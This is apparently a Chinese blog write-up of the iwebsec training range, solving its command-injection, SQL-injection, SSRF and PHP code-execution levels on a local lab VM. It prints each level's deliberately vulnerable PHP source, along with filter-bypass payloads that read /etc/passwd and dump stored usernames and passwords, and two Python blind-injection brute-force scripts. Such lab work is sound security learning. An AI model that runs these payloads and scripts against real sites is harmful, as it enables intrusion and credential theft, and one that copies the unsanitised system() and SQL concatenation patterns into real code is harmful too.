---
title: iwebsec---- not only rce/sqli
date: 2024年7月27日
updated: 2024年7月27日
tags:
  - 靶场
categories: 靶场
keywords:
description: iwebsec

---

iwebsec是一个相对比较全的靶场，上面啥类型的都有，感觉有点像pikachu的进阶版（刚配置好还没打）
# 环境配置

下载地址直接去官网就好[iwebsec](http://www.iwebsec.com)

懒人，直接下的iwebsec的虚拟机（密码就是iwebsec，账号也是），打开直接查看ip地址，在浏览器打开时这个样子
[![pkqQPDx.png](https://s21.ax1x.com/2024/07/27/pkqQPDx.png)](https://imgse.com/i/pkqQPDx)

# rce

## 01

[![pkqQAUO.png](https://s21.ax1x.com/2024/07/27/pkqQAUO.png)](https://imgse.com/i/pkqQAUO)

在ubuntu里面打开docker ps查看容器
```
iwebsec@ubuntu:~$ docker ps
CONTAINER ID   IMAGE             COMMAND       CREATED       STATUS                  PORTS                                                           NAMES
bc23a49cb37c   iwebsec/iwebsec   "/start.sh"   3 years ago   Up Less than a second   0.0.0.0:80->80/tcp, 0.0.0.0:6379->6379/tcp, 0.0.0.0:7001->7001/tcp, 0.0.0.0:8000->8000/tcp, 0.0.0.0:8080->8080/tcp, 22/tcp, 0.0.0.0:8088->8088/tcp, 0.0.0.0:13307->3306/tcp   beautiful_diffie
```
通过docker exec进入到docker容器的命令行界面
```
docker exec -it bc23a49cb37c bash
```
因为第一关的url是
```
http://192.168.159.137/exec/01.php
```

所以直接找/var/www/html/exec/01.php查看源码


```01.php
[root@bc23a49cb37c /]# cat /var/www/html/exec/01.php
<?php

  require_once('../header.php');
  ?>
<html>
        <head>
                <title>命令执行漏洞</title>
        </head>
        <h2>命令执行漏洞</h2>
                <div class="alert alert-success">
                        <p>/01.php?ip=127.0.0.1 </p>
                </div>
        <body>
<?php
        if(isset($_GET['ip'])){

    $ip = $_GET['ip'];

    system("ping -c 2 ".$ip);
        }else{
                exit();
        }

?>
```

require_once嵌套一个header.php在里面

html的内容仅仅包含了两个标题以及显示将要ping的IP地址的段落

源码表示没对其做任何的过滤，仅仅就只需要在ip地址后面加入命令连接符号就可以渗透

他都这么有诚意了那咱也不好意思辜负人家的希望对吧

[![pkqQaMn.png](https://s21.ax1x.com/2024/07/27/pkqQaMn.png)](https://imgse.com/i/pkqQaMn)

直接就是
```
?url=127.0.0.1 | cat /etc/passwd
```


## 02
同理看源码
```02.php
[root@bc23a49cb37c /]# ls
bin   dev  home  lib64       media  opt        proc  sbin     srv       sys  usr
boot  etc  lib   lost+found  mnt    php-build  root  selinux  start.sh  tmp  var
[root@bc23a49cb37c /]# cd var
[root@bc23a49cb37c var]# ls
cache  empty  lib    lock  mail  opt       run    tmp  yp
db     games  local  log   nis   preserve  spool  www
[root@bc23a49cb37c var]# cd www
[root@bc23a49cb37c www]# ls
cgi-bin  error  html  icons  manual
[root@bc23a49cb37c www]# cd html
[root@bc23a49cb37c html]# ls
css       exec      fi          header.php  middleware  php.php  ssrf         upload  xxe
database  execcode  footer.php  index.php   parse       sqli     unserialize  xss
[root@bc23a49cb37c html]# cd exec
[root@bc23a49cb37c exec]# ls
01.php  02.php  03.php  04.php  05.php  css
[root@bc23a49cb37c exec]# cat 02*
<?php

  require_once('../header.php');
  ?>
<html>
        <head>
                <title>命令执行漏洞空格绕过</title>
        </head>
        <h2>命令执行漏洞空格绕过</h2>
                <div class="alert alert-success">
                        <p>/02.php?ip=127.0.0.1</p>
                </div>
        <body>
<?php
        if(isset($_GET['ip'])){

                if (preg_match('/ /', $_GET['ip'])) {
                die('error!!!');
                }
                else{
                        $ip = $_GET['ip'];

                }
    system("ping -c 2 ".$ip);
        }else{
                exit();
        }

?>
if (preg_match('/ /', $_GET['ip']))
```

空格的话有挺多可以替换的
### 制表符
```
%09
```
[![pkqQDaT.png](https://s21.ax1x.com/2024/07/27/pkqQDaT.png)](https://imgse.com/i/pkqQDaT)

###
```
<
```
[![pkqQ6G4.png](https://s21.ax1x.com/2024/07/27/pkqQ6G4.png)](https://imgse.com/i/pkqQ6G4)

###
```
{}
```
``` {cat,/etc/passwd} ```
[![pkqQRMR.png](https://s21.ax1x.com/2024/07/27/pkqQRMR.png)](https://imgse.com/i/pkqQRMR)

###
```
${IFS}
```

[![pkqQfqx.png](https://s21.ax1x.com/2024/07/27/pkqQfqx.png)](https://imgse.com/i/pkqQfqx)


###
```
$IFS$9
```
和``` ${IFS} ```一样，我就不贴图了

## 03

03的源码好像被我玩没了...汗

https://i-blog.csdnimg.cn/blog_migrate/74f16ec3e63d87817b77479ae23edc3e.png

嫖了wp的图片，，，，就这样吧毁灭吧烦了

明确的过滤了cat，那我们可以用tac


好吧,nothing，，，，好吧，后面发现是我把环境炸了...难评，理论上tac也可以


### 拼接
```
ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd
```
### 替换cat的命令

```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
sh /etc/passwd 2>%261 //报错出文件内容
```

环境被我炸了我也懒得重打一边了（最后还是重新找着wp重写了一个)
[![pkLCoff.png](https://s21.ax1x.com/2024/07/29/pkLCoff.png)](https://imgse.com/i/pkLCoff)
```
<?php

  require_once('../header.php');
  ?>
<html>
        <head>
                <title>命令执行漏洞命令绕过</title>
        </head>
        <h2>命令执行漏洞绕过</h2>
                <div class="alert alert-success">
                        <p>/03.php?ip=127.0.0.1</p>
                        <p>cat命令执行</p>
                </div>
        <body>
<?php
        if(isset($_GET['ip'])){

                if (preg_match('/cat/', $_GET['ip'])) {
                die('error!!!');
                }
                else{
                        $ip = $_GET['ip'];

                }
    system("ping -c 2 ".$ip);
        }else{
                exit();
        }

?>
```

tac 和拼接都是可以的

其他的也可以但我就试了这两个
[![pkLCH1S.png](https://s21.ax1x.com/2024/07/29/pkLCH1S.png)](https://imgse.com/i/pkLCH1S)
[![pkLCb6g.png](https://s21.ax1x.com/2024/07/29/pkLCb6g.png)](https://imgse.com/i/pkLCb6g)

## 04
```
<?php

  require_once('../header.php');
  ?>
<html>
        <head>
                <title>命令执行漏洞通配符绕过</title>
        </head>
        <h2>命令执行漏洞通配符绕过</h2>
                <div class="alert alert-success">
                        <p>/04.php?ip=127.0.0.1</p>
                </div>
        <body>
<?php
        if(isset($_GET['ip'])){

                if (preg_match('/etc|passwd/', $_GET['ip'])) {
                die('error!!!');
                }
                else{
                        $ip = $_GET['ip'];

                }
    system("ping -c 2 ".$ip);
        }else{
                exit();
        }

?>
```

过滤了etc|passwd关键字

### 通配符
?和*，懂得都懂
[![pkLCqXQ.png](https://s21.ax1x.com/2024/07/29/pkLCqXQ.png)](https://imgse.com/i/pkLCqXQ)

## 05
```
<?php

  require_once('../header.php');
  ?>
<html>
        <head>
                <title>命令执行漏洞base64编码绕过</title>
        </head>
        <h2>命令执行漏洞base64编码绕过</h2>
                <div class="alert alert-success">
                        <p>/05.php?ip=127.0.0.1</p>
                </div>
        <body>
<?php
        if(isset($_GET['ip'])){

                if (preg_match('/id/', $_GET['ip'])) {
                die('error!!!');
                }
                else{
                        $ip = $_GET['ip'];

                }
    system("ping -c 2 ".$ip);
        }else{
                exit();
        }

?>
```

过滤了关键字id


## 编码绕过

先将id进行base64加密
```
[root@bc23a49cb37c exec]# echo id|base64
aWQK
[root@bc23a49cb37c exec]# echo aWQK | base64 -d
id
```

反引号括起来的值会被当做命令执行，于是使用如下命令替换

```ip=127.0.0.1;`echo aWQK|base64 -d`  ```



成功

[![pkLC7p8.png](https://s21.ax1x.com/2024/07/29/pkLC7p8.png)](https://imgse.com/i/pkLC7p8)

至此

iwebsec的rec结束

# sqli

## mysql基本用法

mysql常用的语句就是查库查表查列查字段
分别对应下面
```
1）查库：select schema_name from information_schema.schemata;
2) 查表：select table_name from information_schema.tables where table_schema='security';
3）查列：select column_name from information_schema.columns where table_name='users';
4) 查字段：select username,password from security.users;
```
mysql注释
```
--+
--       --后面有一个空格
#
```
limit
```
select * from where id="?" limit 0,1
limit 0,1;其中第一位是从第几个开始，比如0代表从第一个开始，而第二位的1代表的就是显示多少个数据。
```
单引号判断
```
$id参数左右有无单双引号，括号等方式闭合
最典的是 http://xxx/xxx.php?id=1'
如果返回错误就说明存在sql注入，因为无论字符型还是整型都会因为单引号个数不匹配而报错
```
order by
```
order by n：通过第n列进行排序，默认升序。
用来判断表中的数据有多少列，用二分法进行测试。
```
mysql函数
```
1） SYSTEM_USER()	返回当前用户；	SELECT SYSTEM_USER();
2） USER()	返回当前用户		SELECT USER();
3） CURRENT_USER()	返回当前用户		SELECT CURRENT_USER();
4） DATABASE()	返回当前数据库名	SELECT DATABASE();
5） VERSION()	返回数据库的版本号	SELECT VERSION()；
6） @@datadir	返回mysql安装路径		SELECT @@DATADIR;
7） @@version_compile_os		返回当前操作系统	SELECT @@version_compile_os；
8)  GROUP_CONCAT()		将所有的数据拼接后作为一行进行显示
9） CONCAT_WS('~',A,B)	以A~B的形式将数据显示出来
10) left()函数：  left(database(),1)=‘s’            left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0
11) regexp函数：  select user() regexp ‘r’          user()的结果是root，regexp为匹配root的正则表达式
12) like函数：    select user() like ‘ro%’          匹配与regexp相似。
13) substr(a,b,c)   select substr() XXXX           substr(a,b,c)从位置b开始，截取a字符串c位长度
	SUBSTR(str,pos): pos开始的位置，一直截取到最后
14) ascii()  								       将某个字符串转化为ascii值
15) chr(数字)   或者是ord(‘字母’)    使用python中的两个函数可以判断当前的ascii值是多少
16）CONCAT(str1,str2,…)     返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。
17）mid(str,pos,len)  与substr类似
```
还有一个[mysql之group_concat函数详解](https://blog.csdn.net/u012620150/article/details/81945004)

读写文件
```
into outfile 写文件
用法： select 'mysql is very good' into outfile 'test1.txt‘;
文件位置： C:\phpstudy\PHPTutorial\MySQL\data

或者是select 'crow 666' into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’;
文件位置： C:\phpstudy\PHPTutorial\WWW\sqli\Less-7
注意事项： \\

load_file()  读取本地文件  select load_file('C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’);

```
常用判断注入点方法
```
1）'
2)')
3) '))
4) "
5) ")
6) "))
```
handler命令，是smysql专属的，可以让我们一行一行得到一个表中的数据
```
HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE
```
- 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
- 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
- 通过HANDLER tbl_name CLOSE来关闭打开的句柄。通过索引去查看的话可以按照一定的顺序，获取表中的数据。
- 通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 通过索引列指定一个值，可以指定从哪一行开始。
- 通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 如果我们不想浏览一个表的所有行，可以使用where和limit子句。

## 01数字型注入
### tap1 判断是否存在注入
```
http://192.168.159.137/sqli/01.php?id=1%27
```
下面报错，说明存在sql注入漏洞
### tap2 判断诸如类型
题目都给说了，数字型
### tap3 判断列数
```
?id=1 ordre by 4
这里的报错是unknown column 4 in order caluse说明没有四列
?id=-1 union select 1,2,3
这里要在1前面加一个-白哦是不显示内容，
```

[![pkLkqCq.png](https://s21.ax1x.com/2024/07/29/pkLkqCq.png)](https://imgse.com/i/pkLkqCq)
[![pkLkL80.png](https://s21.ax1x.com/2024/07/29/pkLkL80.png)](https://imgse.com/i/pkLkL80)

### tap4 爆库

```
?id=-1 union select 1,2,database()
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata
```
[![pkLkzb4.png](https://s21.ax1x.com/2024/07/29/pkLkzb4.png)](https://imgse.com/i/pkLkzb4)
[![pkLkvKU.png](https://s21.ax1x.com/2024/07/29/pkLkvKU.png)](https://imgse.com/i/pkLkvKU)

### tap5 爆表
[![pkLkxrF.png](https://s21.ax1x.com/2024/07/29/pkLkxrF.png)](https://imgse.com/i/pkLkxrF)

### tap6 爆列
```
http://192.168.159.137/sqli/01.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='sqli'
```
[![pkLAAxK.png](https://s21.ax1x.com/2024/07/29/pkLAAxK.png)](https://imgse.com/i/pkLAAxK)

### tap7 爆数据
```
 id=-1 union select 1,2,group_concat(concat_ws('~',username,password)) from iwebsec.sqli
```
[![pkLAk26.png](https://s21.ax1x.com/2024/07/29/pkLAk26.png)](https://imgse.com/i/pkLAk26)


## 字符串
我靠，还是特么的宽字节注入，后面再说，这个跟上面的数字型差不多,我下面宽字节再讲吧


## bool盲注

盲注就是无回显的注入
[![pkL8M2F.png](https://s21.ax1x.com/2024/07/29/pkL8M2F.png)](https://imgse.com/i/pkL8M2F)
[![pkL8K8U.png](https://s21.ax1x.com/2024/07/29/pkL8K8U.png)](https://imgse.com/i/pkL8K8U)

可以看出，一个有回显一个没有，对于这种类型的盲注一般直接跑脚本就可以了

```硬爆破
# @Author:refeng

import requests
import string

strings = string.printable
flag = ""
# url = 'http://192.168.159.137/sqli/03.php'
for i in range(1,60):
    for j in strings:
        # 爆库
        # url = "http://192.168.159.137/sqli/03.php?id=1 and ascii(substr((database()),{0},1))={1}--+".format(i,ord(j))
        # 爆表
        # url = "http://192.168.159.137/sqli/03.php?id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='iwebsec'),{0},1))={1}--+".format(i,ord(j))
        # 爆列
        # url = "http://192.168.159.137/sqli/03.php?id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='user'),{0},1))={1}--+".format(i,ord(j))
        # 爆数据
        url = "http://192.168.159.137/sqli/03.php?id=1 and ascii(substr((select group_concat(concat_ws('~',username,password)) from iwebsec.user),{0},1))={1}--+".format(i,ord(j))
        res = requests.get(url)
        if 'welcome' in res.text:
            flag += j
            print(flag)
            break
        else:
            continue

```


```二分法
# @Author:refeng
import requests

url = "http://192.168.159.137/sqli/03.php?id=1 and "

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        #爆库
        payload = f"1=if(ascii(substr((select  database() limit 0,1),{i},1))>{mid},1,0) --+"
        #ascii(substr((select database() limit 0,1),{i},1))：这部分是一个子查询，用来获取数据库名中第 {i} 个字符的 ASCII 值。
        #爆表
        # payload = f"1=if(ascii(substr((select  group_concat(table_name) from information_schema.tables where table_schema='iwebsec' limit 0,1),{i},1))>{mid},1,0) --+"
        #爆列
        # payload = f"1=if(ascii(substr((select  group_concat(column_name) from information_schema.columns where table_name='user' limit 0,1),{i},1))>{mid},1,0) --+"
        #爆数据
        # payload = f"1=if(ascii(substr((select  group_concat(concat_ws('~',username,password)) from iwebsec.user limit 0,1),{i},1))>{mid},1,0) --+"
        r = requests.get(url + payload)
        if "welcome" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```
## 时间盲注

```
?id=1
?id=1 and if(1=1,sleep(5),1)  --+
```
[![pkL81KJ.png](https://s21.ax1x.com/2024/07/29/pkL81KJ.png)](https://imgse.com/i/pkL81KJ)


tip:head 和 tail 分别代表当前字符的 ASCII 可能取值范围的上限和下限。
```
>>
```
是右移位操作符，将数字向右移动指定的位数。1代表将数字向右移动一位，相当于除以2取整数部分。

## updatexml()函数（开报错注入了）
```
updatexml(xml_doument,XPath_string,new_value)
```
其中
>>xml_document是string格式，为xml文档对象的名称，文中为doc

>>XPath_string自己搜吧，写脚本的时候request的

>> new_value，string格式，替换查找到的符合条件的数据

[![pkL8JV1.png](https://s21.ax1x.com/2024/07/29/pkL8JV1.png)](https://imgse.com/i/pkL8JV1)


```payload
1）爆库：?id=1 and updatexml(1,concat(0x5e,database(),0x5e),1) --+
2）爆表：?id=1 and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema = 'iwebsec' limit 0,1),0x5e),1) --+		#limit中的数据可以改
3）爆列：?id=1 and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name = 'sqli' limit 0,1),0x5e),1) --+
另一种方式爆出来，最多一次爆出31个字符,n为可变数字：显示(n,n+31)的字符
?id=1 and updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name = 'sqli'),1),0x5e),n) --+
如：显示第一个到第三十二个字符
?id=1 and updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name = 'sqli'),1),0x5e),1) --+
4）爆数据：?id=1 and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from sqli),1)),0x5e),1) --+

```

![](https://pic.imgdb.cn/item/66a77f7ed9c307b7e92158a5.png)

- updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name = 'sqli'),1),0x5e),1):
- updatexml: 这是MySQL的内置函数，用于更新XML数据。
- 1: 这是XML路径，指定要更新的XML数据中的位置。
- concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name = 'sqli'),1),0x5e):
- - concat: 这是一个用于连接字符串的函数。
- -  0x5e: 这是ASCII码中的插入符号“^”。
- - substr((select group_concat(column_name) from information_schema.columns where table_name = 'sqli'),1): 这部分是一个SELECT语句，从information_schema.columns系统表中检索出表名为sqli的所有列名，并通过group_concat函数将这些列名连接成一个字符串。
- - 1: 这是substr函数的第二个参数，表示从字符串的第一个字符开始截取。
整体上，这个部分构造了一个XML数据，其中包含了从表sqli的information_schema.columns中检索到的列名字符串。
- 1: 这是XML的新值，即要更新的数据。

## 到了我们信心想念的宽字节

 >>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。在使用PHP连接MySQL的时候，当设置“character_set_client = gbk”时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入

>>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）

>>GBK首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），例如%df和%5C会结合；GB2312是被GBK兼容的，它的高位范围是0xA1-0xF7，低位范围是0xA1-0xFE(0x5C不在该范围内)，因此不能使用编码吃掉%5c

如图
![](https://pic.imgdb.cn/item/66a84a69d9c307b7e9ac3f4f.png)

图中将其转换为gbk，


注入也很简单，就是在字符型后面加了一个%df
```
1）爆库
?id=-1%df' union select 1,2,database() --+
2）爆表
?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563 --+
0x69776562736563：iwebsec的十六进制编码
3）爆列
?id=-1%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572--+
0x75736572：user的十六进制编码
4）爆数据
?id=-1%df' union select 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user--+
```

## 空格过滤绕过
```
<?php

  require_once('../header.php');
  require_once('db.php');
  ?>
<html>
        <head>
                <title>空格过滤</title>
        </head>
        <h2>空格过滤</h2>
                <div class="alert alert-success">
                        <p>/07.php?id=1 </p>
                </div>
        <body>
  <?php
  if(isset($_GET['id'])){
        if (preg_match('/ /', $_GET["id"])) {
                die("ERROR");
        }else{
                $id=$_GET['id'];
                $sql="SELECT * FROM user WHERE id=$id LIMIT 0,1";
                $result=mysql_query($sql);
        }
  }else{
                exit();
        }
        if ($result) {
                ?>
                <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
                <?php
                while ($row = mysql_fetch_assoc($result)) {
                        echo "<tr>";
                        echo "<td>".$row['id']."</td>";
                        echo "<td>".$row['username']."</td>";
                        echo "<td>".$row['password']."</td>";
                        echo "</tr>";
                }
                echo "</table>";
        }
        else
        {
//      echo '<font color= "#FFFFFF">';
        print_r(mysql_error());
//      echo "</font>";
        }

?>
```
想法就是强制制造空格
```
1）/*%0a*/	/**/	强行制造空格
2）%a0			代替空格
3）%0a,%0d,%0b,/%0a/
```

payload：
```
?id=1/**/and/**/1=1/**/#
爆库
?id=-1/**/union/**/select/**/1,2,database()#
爆表
?id=-1%0dunion%0dselect%0d1,2,group_concat(table_name)%0dfrom%0dinformation_schema.tables%0dwhere%0dtable_schema=0x69776562736563#
爆列
?id=-1%a0union%a0select%a01,2,group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=0x75736572#
爆数据
?id=-1/**/union/**/select/**/1,2,group_concat(concat_ws(0x7e,username,password))/**/from/**/iwebsec.user#

```
## 大小写绕过

看源码是过滤了select ，但是没有过滤Select
payload
```
爆库
?id=-1 union Select 1,2,database()#
爆表
?id=-1 union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563#
爆列
?id=-1 union Select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572#
爆数据
?id=-1 union Select 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user#

```


## 双写绕过
再上一个的基础上过滤了大小写
那么我可以双写绕

![](https://pic.imgdb.cn/item/66a84d63d9c307b7e9aeaf9a.png)

```
爆库
?id=-1 union seselectlect 1,2,database()#
爆表
?id=-1 union seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563#
爆列
?id=-1 union seselectlect 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572#
爆数据
?id=-1 union seselectlect 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user#

```


## 双重url绕过

![](https://pic.imgdb.cn/item/66a84d63d9c307b7e9aeafb8.png)

可以看到第一层过滤了select以及SELECT,然后用urldecode解码

我们正常上传到一次服务器会进行一次解码，这个就相当于再解码一次

所以这个题的payload
```
爆库
?id=-1 %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34 1,2,database()#
爆表
?id=-1 %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563#
爆列
?id=-1 %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572#
爆数据
?id=-1 %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user#
```


## 十六进制编码绕过

payload
```
1）爆库
-1 union select 1,2,database()#
2）爆表
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563--+
0x69776562736563：iwebsec的十六进制编码
3）爆列
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572--+
0x75736572：user的十六进制编码
4）爆数据
?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user--+

```

## 等价函数
这个就有点不当人了，过滤了=
![](https://pic.imgdb.cn/item/66a85291d9c307b7e9b29ca5.png)

有几个替换方案
```
不加通配符的like执行的效果和=一致，所以可以用来绕过；

rlike的用法和上面的like一样，没有通配符效果和=一样；

regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配

<> 等价于 != ，所以在前面再加一个!结果就是等号了
```

payload
```
1）爆库
-1 union select 1,2,database()#
2）爆表
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x69776562736563--+
0x69776562736563：iwebsec的十六进制编码
3）爆列
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name like 0x75736572--+
0x75736572：user的十六进制编码
4）爆数据
?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user--+

```


## 二次注入

这次是一个登录界面，但是看源码发现不存在注入

![](https://pic.imgdb.cn/item/66a85291d9c307b7e9b29cb1.png)

因为sql语句仅仅使用了插入的insert，但是插入过程只进行了字符转义没有其他的过滤

![](https://pic.imgdb.cn/item/66a85291d9c307b7e9b29cbf.png)

我们看一下重置界面，发现有一个```$username```的拼接，我们可以把sql语句放在这里

注册，尝试```admin'#```密码随便输入，，然后去重置页面根据邮箱找回

爆出来了admin的账号密码
![](https://pic.imgdb.cn/item/66a852dad9c307b7e9b2dd95.png)

输入
```
1' or updatexml(1,concat(0x7e,database()),0)#
```
![](https://pic.imgdb.cn/item/66a852dad9c307b7e9b2ddac.png)

# ssrf

ssrf就是对引用的ip没做限制导致的

不会的话看这篇
[ssrf](https://blog.csdn.net/vodkaDL/article/details/114492348?spm=1001.2014.3001.5502)


## ssrf文件读取
![](https://pic.imgdb.cn/item/66a88619d9c307b7e9df7c77.png)

![](https://pic.imgdb.cn/item/66a88619d9c307b7e9df7c77.png)

## ssrf内网探测

![](https://pic.imgdb.cn/item/66a88619d9c307b7e9df7caa.png)
## ssrf内网应用
![](https://pic.imgdb.cn/item/66a8861ad9c307b7e9df7cbe.png)


# xxe

xxe外部实体注入漏洞

原理部分可以看这篇[xxe](https://blog.csdn.net/weixin_44420143/article/details/118721145)

有点抽象，但是我的理解就是xml的外部实体引入但是有没有对其进行过滤就导致了xxe漏洞

```
<?php

  require_once('../header.php');

  ?>
<html>
        <head>
                <title>XXE漏洞</title>
        </head>
        <h2>XXE漏洞</h2>
                <div class="alert alert-success">
                        <p>input xml</p>
                </div>
        <body>
  <?php
libxml_disable_entity_loader (false);

$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
if($xmlfile){
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);

        $creds = simplexml_import_dom($dom);
        $username = $creds->username;
        $password = $creds->password;
}
        else{
                exit();
        }
?>
                <table class='table table-striped'>

                <?php
                echo 'hello ' . $username;

                echo "</table>";

?>
```
这个明显是有一个file_get_contents函数引用了php://input的东西并且没做任何的过滤就应用了，并且在其中运用了username，，试了试xxe但是一直在这个地方，怪了

https://pic.imgdb.cn/item/66a88f7cd9c307b7e9e8c355.png

一会去xxe-labs打吧，这里的xxe跳了

# 代码执行

就是单纯的代码执行，就和你传上一句话木马以后一个样子

## 01 eval直接输出

eval() 函数把字符串按照 PHP 代码来计算。
该字符串必须是合法的 PHP 代码，且必须以分号结尾。
```
1=phpinfo();

```

![](https://pic.imgdb.cn/item/66a8904bd9c307b7e9e96db5.png)


## 02 assert

assert函数其实是一个断言函数，断言函数用于在调试过程中捕捉程序的错误。“断言”在语文中的意思是“断定”、“十分肯定地说”，在编程中是指对某种假设条件进行检测，如果条件成立就不进行任何操作，如果条件不成立就捕捉到这种错误，并打印出错误信息，终止程序执行。
如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。
注意assert的一句话mua，不需要以分号结尾。

```
1=phpinfo();

```

![](https://pic.imgdb.cn/item/66a890efd9c307b7e9e9f05d.png)

## 03 call_user_func

call_user_func()是调用回调函数，可以将把一个参数作为回调函数的参数

![](https://pic.imgdb.cn/item/66a8921cd9c307b7e9eadcb0.png)

上面都告诉你咋写了

![](https://pic.imgdb.cn/item/66a892c8d9c307b7e9eb6960.png)

## 04 call_user_func_array
和03肉眼可见的相似

实际上也是相似的
[call_user_func 与 call_user_func_array](https://blog.csdn.net/huaweichenai/article/details/110670301)

![](https://pic.imgdb.cn/item/66a89390d9c307b7e9ec15d9.png)


## 05 create_function

php内置函数，用于创建lambda匿名函数的

>> string create_function ( $args, $code )

>> 参数：该函数接受以下两个参数：
>> $args:它是一个字符串类型的函数参数。
>> $code:它是字符串类型的函数代码。

注意：通常，这些参数将作为单引号分隔的字符串传递。使用单引号引起来的字符串的原因是为了防止变量名被解析，否则，将需要双引号来转义变量名，例如\ $avar。

返回值：此函数以字符串形式返回唯一的函数名称，否则，在错误时返回FALSE。

```
<?php  require_once('../header.php');?>
<html>
        <head>
                <title>代码执行漏洞</title>
        </head>
        <h2>代码执行漏洞create_function函数示例</h2>
                <div class="alert alert-success">
                        <p>/05.php?id=1;}phpinfo();/*</p>
                </div>
        <body>
<?php
        if(isset($_GET['id'])){

                $id = $_GET['id'];
                $code = 'echo '.$func.'test'.$id.';';
                create_function('$func',$code);
        }else{
                exit();
        }

?>
```

>将 $_GET['id'] 的值赋给变量 $id。
>
>构建一个字符串 $code，其中包含了将要创建的匿名函数的代码。这个代码使用了 $func 变量和 $id 变量。
>
>使用 create_function 函数创建一个匿名函数，这个函数的参数是 $func，函数体是 $code 中定义的代码。

get方式传参
```?id=1;}echo(`cat /etc/passwd`);/*```

![](https://pic.imgdb.cn/item/66a895b7d9c307b7e9ee0ba7.png)


## 06 array_map

array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。
回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。

```
<?php  require_once('../header.php');?>
<html>
        <head>
                <title>代码执行漏洞</title>
        </head>
        <h2>代码执行漏洞array_map函数示例</h2>
                <div class="alert alert-success">
                        <p>/06.php?func=system&argv=id</p>
                </div>
        <body>
